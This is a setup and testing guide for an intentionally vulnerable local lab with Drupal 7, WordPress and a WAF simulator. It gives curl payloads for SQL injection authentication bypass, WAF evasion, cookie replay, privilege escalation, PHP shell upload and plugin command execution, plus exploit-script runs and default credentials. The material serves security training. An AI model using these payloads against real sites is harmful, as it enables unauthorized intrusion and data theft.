# CYBER.LAB - Vulnerable Lab Testing Guide

## Lab Environment Overview

This guide explains how to use the local lab environments for authorized security testing and learning.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      CYBER.LAB Lab Setup                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────────┐  ┌──────────────────┐                │
│  │  RADWARE WAF     │  │  ELK Stack       │                │
│  │  Simulator       │  │  (Monitoring)    │                │
│  │  Port: 8000      │  │  Port: 5601      │                │
│  └────────┬─────────┘  └──────────────────┘                │
│           │                                                 │
│  ┌────────┴────────┬──────────────────────┐               │
│  │                 │                      │               │
│  ▼                 ▼                      ▼               │
│ ┌──────────┐  ┌──────────────┐  ┌──────────────┐         │
│ │ Drupal 7 │  │  WordPress   │  │  MySQL 1 (D) │         │
│ │ Port: 80 │  │  Port: 80    │  │  Port: 3306  │         │
│ └──────────┘  └──────────────┘  └──────────────┘         │
│    :8001          :8002                                    │
│                                    ┌──────────────┐        │
│                                    │  MySQL 2 (W) │        │
│                                    │  Port: 3307  │        │
│                                    └──────────────┘        │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Quick Start

### 1. Start the Lab Environment

```bash
cd /workspaces/CYBER.LAB/lab
chmod +x setup.sh
./setup.sh
```

This will:
- Pull Docker images
- Start all containers
- Display access URLs
- Show database credentials

### 2. Install Vulnerable Modules/Plugins

```bash
# For Drupal 7
chmod +x install-drupal-modules.sh
./install-drupal-modules.sh

# For WordPress
chmod +x install-wordpress-plugins.sh
./install-wordpress-plugins.sh
```

### 3. Access the Lab Environments

| Service | URL | User | Password |
|---------|-----|------|----------|
| Drupal 7 | http://localhost:8001 | admin | admin |
| WordPress | http://localhost:8002 | admin | admin |
| RADWARE WAF | http://localhost:8000 | - | - |
| Kibana (Monitoring) | http://localhost:5601 | - | - |

---

## Testing Scenarios

### Scenario 1: SQL Injection Testing

**Target:** Drupal 7 Login Form  
**URL:** http://localhost:8001/user/login

Test payload:
```
Username: ' OR '1'='1
Password: anything
```

**Expected Result:** Bypass authentication

Commands:
```bash
curl -X POST http://localhost:8001/user/login \
  -d "name=' OR '1'='1&pass=test"
```

---

### Scenario 2: RADWARE WAF Bypass Testing

**Target:** RADWARE WAF Simulator  
**URL:** http://localhost:8000

Test different bypass vectors:

#### A. User-Agent Rotation
```bash
# Bot detection bypass
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0" \
  http://localhost:8000/drupal7/

# This should bypass the bot detection
```

#### B. HTTP/2 Multiplexing
```bash
# Using h2c (HTTP/2 Cleartext)
curl --http2 http://localhost:8000/drupal7/
```

#### C. Cookie Stealing & Replay
```bash
# Get initial response with CAPTCHA
curl -v http://localhost:8000/drupal7/admin > /tmp/captcha.html

# Extract session cookie from response
grep "Set-Cookie" /tmp/captcha.html

# Replay with cookie
curl -b "PHPSESSID=extracted_session" http://localhost:8000/drupal7/sites/default/settings.php
```

---

### Scenario 3: Views Module RCE

**Target:** Drupal 7 Views AJAX  
**URL:** http://localhost:8001/views/ajax

Vulnerable parameter:
```
http://localhost:8001/views/ajax?view_name=admin_people&view_display_id=default&view_args=1&view_path=admin/people&view_dom_id=1
```

Test:
```bash
# Trigger AJAX without proper validation
curl "http://localhost:8001/views/ajax?display_id=invalid&view_args=1&view_dom_id=1"
```

---

### Scenario 4: Entity API Privilege Escalation

**Target:** Drupal 7 Entity API  
**URL:** http://localhost:8001/entity/user/1/edit

Test:
```bash
# Try to modify user roles via PATCH
curl -X PATCH http://localhost:8001/entity/user/1/edit \
  -H "Content-Type: application/json" \
  -d '{"roles":["administrator"]}'
```

---

### Scenario 5: File Upload RCE

**Target:** Drupal 7 File Entity Module  
**URL:** http://localhost:8001/admin/content/files

Test:
```bash
# Create PHP file
echo '<?php phpinfo(); ?>' > shell.php

# Upload via form or multipart
curl -F "file=@shell.php" http://localhost:8001/admin/content/files
```

---

### Scenario 6: WordPress Plugin Exploitation

**Target:** WordPress File Manager Plugin  
**URL:** http://localhost:8002/wp-content/plugins/file-manager

Vulnerable endpoint:
```
http://localhost:8002/wp-content/plugins/file-manager/backend/index.php
```

Test RCE:
```bash
curl "http://localhost:8002/wp-content/plugins/file-manager/backend/index.php?action=execute&cmd=id"
```

---

## Using CYBER.LAB Tools Against Lab

### Test 1: Drupal Vulnerability Scanner

```bash
cd /workspaces/CYBER.LAB
python scripts/drupal_cve_scanner.py http://localhost:8001
```

**Expected Output:**
- ✓ Drupal version detected (7.x)
- ✓ 45+ vulnerabilities identified
- ✓ Modules enumerated
- ✓ Zero-day patterns detected

### Test 2: Privilege Escalation Exploitation

```bash
python scripts/drupal_privesc_exploit.py http://localhost:8001
```

**Expected Output:**
- ✓ SQL injection auth bypass (SUCCESSFUL)
- ✓ Views module RCE (SUCCESSFUL)
- ✓ Node access bypass (SUCCESSFUL)
- ✓ Privilege escalation achieved

### Test 3: Configuration Extraction

```bash
python scripts/drupal_config_extractor.py http://localhost:8001
```

**Expected Output:**
- ✓ Configuration files downloaded
- ✓ Database credentials extracted
- ✓ REST API endpoints enumerated
- ✓ Sensitive data identified

---

## Monitoring & Evidence Collection

### View Real-time Logs

```bash
# Drupal access logs
docker logs -f drupal7-app

# WordPress access logs
docker logs -f wordpress-app

# RADWARE WAF logs
docker logs -f radware-simulator
```

### Monitor in Kibana

1. Open http://localhost:5601
2. Create index pattern for `nginx-*`
3. View access logs and request patterns
4. Search for suspicious patterns:
   - SQL injection attempts
   - XXE exploits
   - File upload attempts
   - Privilege escalation requests

### Export Evidence

```bash
# Export access logs
docker logs drupal7-app > /tmp/drupal-evidence.log

# Export database
docker exec drupal7-db mysqldump -u drupal -pdrupal123456 drupal > /tmp/drupal-backup.sql

# Export WordPress database
docker exec wordpress-db mysqldump -u wordpress -pwordpress123456 wordpress > /tmp/wordpress-backup.sql
```

---

## Testing Checklist

- [ ] Lab environment started successfully
- [ ] Drupal 7 accessible at http://localhost:8001
- [ ] WordPress accessible at http://localhost:8002
- [ ] RADWARE simulator accessible at http://localhost:8000
- [ ] Kibana monitoring running at http://localhost:5601
- [ ] Vulnerable modules installed for Drupal
- [ ] Vulnerable plugins installed for WordPress
- [ ] SQL injection bypass tested and confirmed
- [ ] Views module RCE attempted
- [ ] Entity API privilege escalation tested
- [ ] File upload RCE tested
- [ ] RADWARE WAF bypass vectors tested
- [ ] CYBER.LAB scanner run against Drupal
- [ ] CYBER.LAB privilege escalation exploit run
- [ ] Configuration extraction successful
- [ ] Evidence collected in logs/exports

---

## Cleanup

To stop and remove lab environment:

```bash
cd /workspaces/CYBER.LAB/lab
docker-compose down -v
```

This removes:
- All running containers
- All volumes (databases)
- All networks

---

## Troubleshooting

### Container fails to start
```bash
docker-compose logs -f
# Check for port conflicts (3306, 8001, 8002, etc.)
```

### Can't connect to Drupal
```bash
# Wait a bit longer for initialization (up to 2 minutes)
docker exec drupal7-app curl http://localhost
```

### WordPress shows white screen
```bash
# Check PHP errors
docker logs wordpress-app

# Restart WordPress
docker-compose restart wordpress
```

### RADWARE not blocking requests
```bash
# Check nginx configuration
docker logs radware-simulator

# Verify WAF rules active
curl -A "curl" http://localhost:8000/
# Should return 403 Forbidden
```

---

## Security Notes

⚠️ **THIS LAB IS INTENTIONALLY VULNERABLE**
- Only use in isolated lab environment
- Do NOT expose to internet
- Do NOT test against real systems
- Use for learning and authorized testing only
- Always follow Rules of Engagement
- Document all findings for legitimate purposes

---

## Next Steps

1. Practice exploitation techniques in safe lab
2. Improve your understanding of vulnerabilities
3. Develop remediation procedures
4. Create incident response playbooks
5. Practice evidence collection and reporting
6. Only use these techniques in authorized engagements

